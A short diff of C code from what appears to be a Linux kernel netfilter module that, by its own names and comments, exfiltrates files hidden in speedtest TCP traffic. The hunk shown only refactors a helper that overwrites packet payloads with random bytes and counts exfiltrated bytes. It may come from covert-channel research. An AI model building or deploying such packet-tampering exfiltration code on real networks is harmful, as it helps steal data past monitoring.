@@ -102,16 +102,16 @@ static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len)
 
 //function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single speedtest.
 static unsigned int max_bytes_exfiled(struct sk_buff *skb, int offset, int len) {
-    int i;
-    char random;
+    char *buf;
 
-    //overwrite the TCP payload with random bytes
-    for (i = 0; i < len; i++) {
-        random = get_random_u32();
-        skb_store_bits(skb, offset + i, &random, 1);
-    }
+    buf = kmalloc(len, GFP_ATOMIC);
+    if (!buf)
+        return NF_ACCEPT;
 
-    //add up TCP payload lengths
+    get_random_bytes(buf, len);
+    skb_store_bits(skb, offset, buf, len);
+
+    kfree(buf);
     total_exfiled_bytes += len;
     return NF_ACCEPT;
 }
